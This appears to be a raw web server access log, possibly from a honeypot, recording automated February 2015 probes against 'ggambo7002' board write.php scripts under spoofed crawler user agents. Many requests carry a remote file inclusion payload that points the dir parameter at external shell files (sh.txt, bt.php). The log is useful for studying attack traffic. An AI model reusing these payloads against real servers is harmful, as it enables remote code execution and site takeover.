71.6.150.241 - - [23/Feb/2015:10:22:24 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
80.68.145.110 - - [23/Feb/2015:10:22:25 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
112.218.68.155 - - [23/Feb/2015:10:22:25 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
114.202.2.31 - - [23/Feb/2015:10:22:30 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [23/Feb/2015:10:22:31 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [23/Feb/2015:10:22:31 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [23/Feb/2015:10:22:33 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
80.68.145.110 - - [23/Feb/2015:10:23:02 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
80.68.145.110 - - [23/Feb/2015:10:23:04 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
80.68.145.110 - - [23/Feb/2015:10:23:04 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
80.68.145.110 - - [23/Feb/2015:10:23:06 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1" 
114.202.2.31 - - [23/Feb/2015:10:24:34 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
114.202.2.31 - - [23/Feb/2015:10:24:36 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
114.202.2.31 - - [23/Feb/2015:10:24:36 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
114.202.2.31 - - [23/Feb/2015:10:24:37 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
198.50.146.246 - - [23/Feb/2015:10:24:47 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:24:48 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:24:49 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:24:50 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
176.31.252.38 - - [23/Feb/2015:10:25:27 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:25:28 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:25:29 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:25:30 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
198.50.146.246 - - [23/Feb/2015:10:25:50 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:25:51 -0800] "GET /honeypot////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:25:51 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:25:52 -0800] "POST /honeypot////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:25:52 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:25:53 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:25:53 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
198.50.146.246 - - [23/Feb/2015:10:25:54 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
71.6.150.241 - - [23/Feb/2015:10:28:54 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [23/Feb/2015:10:28:54 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
71.6.150.241 - - [23/Feb/2015:10:28:55 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [23/Feb/2015:10:28:55 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [23/Feb/2015:10:28:55 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [23/Feb/2015:10:28:56 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
71.6.150.241 - - [23/Feb/2015:10:28:56 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [23/Feb/2015:10:28:57 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
71.6.150.241 - - [23/Feb/2015:10:31:03 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
71.6.150.241 - - [23/Feb/2015:10:31:04 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
71.6.150.241 - - [23/Feb/2015:10:31:04 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
71.6.150.241 - - [23/Feb/2015:10:31:06 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [23/Feb/2015:10:35:43 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:10:35:44 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:10:35:44 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:10:35:45 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:10:35:46 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:10:35:47 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:10:35:47 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:10:35:49 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
211.47.181.38 - - [23/Feb/2015:10:36:11 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:10:36:12 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:10:36:13 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:10:36:14 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
178.33.226.103 - - [23/Feb/2015:10:36:50 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:10:36:51 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:10:36:51 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:10:36:52 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
80.68.145.110 - - [23/Feb/2015:10:37:14 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
80.68.145.110 - - [23/Feb/2015:10:37:15 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
80.68.145.110 - - [23/Feb/2015:10:37:16 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
80.68.145.110 - - [23/Feb/2015:10:37:17 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
176.31.252.38 - - [23/Feb/2015:10:37:28 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:10:37:30 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
114.202.2.31 - - [23/Feb/2015:10:37:30 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
176.31.252.38 - - [23/Feb/2015:10:37:30 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [23/Feb/2015:10:37:31 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
114.202.2.31 - - [23/Feb/2015:10:37:31 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [23/Feb/2015:10:37:32 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [23/Feb/2015:10:37:33 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
176.31.252.38 - - [23/Feb/2015:10:37:50 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:37:52 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:37:52 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [23/Feb/2015:10:37:53 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
80.68.145.110 - - [23/Feb/2015:10:37:56 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
80.68.145.110 - - [23/Feb/2015:10:37:57 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
80.68.145.110 - - [23/Feb/2015:10:37:57 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
80.68.145.110 - - [23/Feb/2015:10:37:59 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
176.31.252.38 - - [23/Feb/2015:10:38:40 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:10:38:42 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:10:38:42 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:10:38:43 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
211.47.181.38 - - [23/Feb/2015:10:38:47 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:10:38:48 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:10:38:49 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:10:38:50 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
198.50.146.246 - - [23/Feb/2015:10:39:09 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
71.6.150.241 - - [23/Feb/2015:10:39:09 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
198.50.146.246 - - [23/Feb/2015:10:39:10 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
198.50.146.246 - - [23/Feb/2015:10:39:11 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
71.6.150.241 - - [23/Feb/2015:10:39:11 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [23/Feb/2015:10:39:11 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
198.50.146.246 - - [23/Feb/2015:10:39:12 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
71.6.150.241 - - [23/Feb/2015:10:39:12 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
114.202.2.31 - - [23/Feb/2015:10:39:45 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [23/Feb/2015:10:39:46 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [23/Feb/2015:10:39:47 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [23/Feb/2015:10:39:48 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [23/Feb/2015:10:42:42 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [23/Feb/2015:10:42:43 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [23/Feb/2015:10:42:43 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [23/Feb/2015:10:42:44 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [23/Feb/2015:10:42:45 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [23/Feb/2015:10:42:47 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [23/Feb/2015:10:42:47 -0800] "POST ////bbs/skin/ggambo7002_board/write.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [23/Feb/2015:10:42:48 -0800] "GET ////bbs/skin/ggambo7002_board/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
